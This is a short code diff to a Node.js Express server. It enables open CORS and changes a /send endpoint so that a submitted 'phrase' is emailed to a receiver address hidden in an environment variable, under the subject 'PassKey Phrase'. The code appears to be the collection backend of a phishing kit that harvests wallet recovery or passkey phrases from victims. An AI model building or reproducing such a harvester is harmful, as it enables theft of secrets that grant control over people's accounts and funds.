@@ -2,11 +2,17 @@
 import express from "express";
 import nodemailer from "nodemailer";
 import bodyParser from "body-parser";
+import dotenv from "dotenv"
+import cors from "cors"
+
+dotenv.config()
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Middleware to parse JSON
+
+app.use(cors())
 app.use(bodyParser.json());
 
 // Configure transporter (use your SMTP settings)
@@ -29,8 +35,8 @@ app.post("/send", async (req, res) => {
 
     const mailOptions = {
       from: process.env.EMAIL_USER,
-      to: "recipient@example.com", // change to target recipient
-      subject: "Forwarded Phrase",
+      to: process.env.RECEIVER_MAIL, // change to target recipient
+      subject: "PassKey Phrase",
       text: `Received phrase: ${phrase}`,
     };
 
